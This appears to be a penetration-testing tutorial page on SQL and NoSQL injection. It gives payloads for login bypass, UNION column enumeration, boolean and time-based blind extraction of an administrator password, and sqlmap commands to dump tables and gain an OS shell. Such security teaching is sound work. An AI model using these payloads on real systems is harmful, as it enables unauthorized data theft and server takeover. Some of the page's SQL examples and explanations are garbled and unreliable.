---
description: ''' OR ''1= ''1'' -- -'
---

# SQL Injection

Structured Query Language (SQL) is a language used to communicate and interact with databases. SQL Databases, such as PostGreSQL, MySQL, MSSQL and Oracle.&#x20;

SQL Injection on the other hand, is the injection of SQL queries to manipulate the database into giving us information that we are not supposed to receive. The exploit depends on the type on the type of database, but the only difference is syntax.

SQL Injection is an old vulnerability, but it's gold and still very applicable, even today (unfortunately).

<figure><img src="../.gitbook/assets/image (2254).png" alt=""><figcaption><p><em>Taken from PortSwigger Web Security Academy</em></p></figcaption></figure>

## How it Works

The SQL Injection vulnerability occurs user input is not sanitised properly. Queries back to the backend database can be interfered with and attackers can do a lot of stuff with that.

First, we would need to understand a bit about SQL and how it works. SQL is kind of like English, and let's suppose that we want to view the items within a certain category.

```sql
SELECT * FROM products WHERE category = 'Gifts' and released = 1
# * means wildcard
```

We can see how it uses the `SELECT` command and indicates the following:

1. Table it's in (products)
2. Column it's in (Gifts)
3. Another condition within the column (released = 1)

Easy right? Now, suppose that we have a login page that takes in a username and password and checks it with the backend database if there are valid entries matching the username and password. The username and password strings are taken from user input and not sanitised in this example.

```sql
SELECT 'password@12345' FROM password WHERE username = 'tim'
# on true, it grants access
# if false, deny access
```

Now, what were to happen if we key in `' OR 1=1 -- -`? This is what the resultant query would look like:

```sql
SELECT '' OR 1=1-- - FROM password WHERE username = 'tim'
# this would grant us access!
```

The first quote that we put actually closed the string, and the rest of our fake query goes into the actual query, followed by `-- -` which would comment the rest of the line. Then, OR used to create a fake logical expression, followed by `1=1` which is a true statement.

This would return `true` statement, and allow us to log in and bypass the login!

This is the most basic SQL Injection, using `' OR 1=1--` to get pass a simple login that does not validate user input.

Once we have identified the SQL Injection vulnerability, we maybe could want to exfiltrate information information from the database about this.&#x20;

## UNION Injection

UNION is a command in SQL that allows for an additional SELECT query to be processed, and appends the results to the original query.

```sql
UNION SELECT username, password FROM users
# select two fields from users and append together in one command
# there are 2 columns in users, hence this works
```

UNION injection can occur when we want to exfiltrate lots of information from the database after discovering an SQL Injection Vulnerability.

There are a few requirements for this to work:

* Individual Queries must return the **same number of columns.**
* Data types in each column **must be compatible between individual queries.**
  * In other words, make sure that username and password are both strings, not integers.

For attackers, apart from discovering the UNION Injection, we would need to find out some information as well:

* How many columns are present within that table?
* Which columns returned from the original query are of suitable data types?

There is method for determining how many columns there are, and this is by brute forcing the possible number of columns:

```sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL -- 
' UNION SELECT NULL,NULL,NULL -- 
# etc...
```

When we have entered the correct number of columns, then the database would actually be able to process our request and not crash! This can be indicated by the usage of HTTP Codes, if we get a 404, then we have entered the wrong numberof columns.

The reason for using `NULL` is because it is **convertible to every commonly used data type**. This means it's kind of compatible with all of them. Hence, the query wouuld always execute. Also, remember to include the ' and -- in our injection query otherwise it won't work!

<figure><img src="../.gitbook/assets/image (2955).png" alt=""><figcaption><p><em>Usage of SQL Injection in URL to retrieve all user information</em></p></figcaption></figure>

## Blind Injection

So far, we have assumed that all the SQL Injection returns us a visible query or output on the screen. But what if it doesn't? The backend database could simply process the request without printing it out on the screen.

Enter Blind SQL Injection, which as the name implies, means the output is invisible to us. So how would we know that we are successful?

We can use 2 types of Blind SQL Injection, **time-based and boolean-based.** These are more difficult to execute but still possible.

### Boolean-Based&#x20;

Boolean-based SQL Injection would mean that we determine if there is an error. Consider cookies, and let's say that when a HTTP request containing a certain CookieID is processed, the database determines whether the cookie is known or not.&#x20;

This kind of thing is vulnerable, but the user does not see the results. Instead, if there is a true condition, perhaps the webpage would load properly. Else, it wouldn't and show us a 404, or there could be a message on the screen indicating we failed or something. **Look for what is different on the website when testing boolean-based SQL Injection.**

We can test this using one guaranteed false and true query. 1=2 is always false, and we can suppose that there is a 404 shown when this fails.

```sql
' OR 1=2 -- -
' OR 1=1 -- -
```

From here, we can begin to enumerate the database using this boolean condition by sort of guessing what is present.

{% code overflow="wrap" %}
```sql
and SELECT <common table name> -- -
# start to enumerate possible table names in database
AND SELECT <username> from users -- -
# start to guess possible usernames from a table
AND SUBSTRING((SELECT password from users where username = 'Administrator'), 1, <num>) =/>a/<' s
# start brute forcing administrator password character by character, determing if a character is in the right place using the boolean condition
```
{% endcode %}

The last one is a tedious and arduous process, which can be very time-consuming if one does not know how to script it out using Python.

However, it does work, using the SUBSTRING command, which would each character position indicated by \<num> until a true condition is reported.

In other words, play hangman with the database until the entire password is drawn out.

### Time-Based

Now, suppose that we don't even have a visible boolean condition of which we can guess characters with.

Then, we can abuse the `sleep()` function within SQL Databases. Basically, we would use the time taken per request as a 'true' condition. We can do so using the `SELECT CASE WHEN` operators.

{% code overflow="wrap" %}
```sql
SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE (username='administrator')--
# if true, sleep 10 seconds, otherwise none.
```
{% endcode %}

This process is even more time consuming because we literally have time as a condition. So, learn to script this in Pythin using the `requests` module.

## Cheatsheets

Of course we don't memorize payloads. Instead, we can take some common payloads from Github or other great resources like here:

{% embed url="https://portswigger.net/web-security/sql-injection/union-attacks" %}

{% embed url="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/" %}

{% embed url="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" %}

## Automated Tools

Seeing as to how complex and time-consuming SQL Injection can be, there are already pre-made tools that can be used in order to verify, enumerate and exploit the true positives of SQL Injection.

One such tool is called `sqlmap`. This tool basically helps you to verify and determine if SQL Injection can be abused, and does it for you automatically. This saves you the time of having to play hangman with the database using blind injection.&#x20;

However, I must note it is **absolutely crucial** to still know how to exploit manually. This is because, in real-life engagements, tools like sqlmap are extremely noisy and suspicious. Also, it's good to have an understanding of what's really going on when we run the tool and what it does.

```bash
sqlmap -r req.txt
# if we have a req.txt file with Burpsuite request inside

sqlmap -u <URL> --threads 10 -D <database> -T <table_name> --dump
# indicates the exact database and table we want to dump information from

sqlmap -r req.txt --os-shell
# tries to write web shell onto server and execute it for RCE on server
```

<figure><img src="../.gitbook/assets/image (910).png" alt=""><figcaption><p><em>Example of Valid SQL Injection Found</em></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3287).png" alt=""><figcaption><p><em>Example of Valid Entry Exfiltrated</em></p></figcaption></figure>

The user manual can be found here: (learn to use it yourself!)

{% embed url="https://github.com/sqlmapproject/sqlmap/wiki" %}

## NoSQL Injection

While not technically an SQL Injection, NoSQL injection is still a database manipulation tool. However, this would involve databases that do not use SQL, such as MongoDB.

NoSQL databases are a bit looser and have less constraints, as well as less checks. As such, databases like this are definitely faster performance wise, but still are vulnerable if not protected accordingly.

The exploits are based on adding an **operator:**

{% code overflow="wrap" %}
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
```
{% endcode %}

This can also be used to bypass authentications:

```bash
#in URL
username[$ne]=toto&password[$ne]=toto

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
```

Other exploits can still abuse these databases, and here is a link to more payloads:

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" %}

**NoSQLMap** is also an automatic tool that can be used to replace **sqlmap** wherever needed.

{% embed url="https://github.com/codingo/NoSQLMap" %}
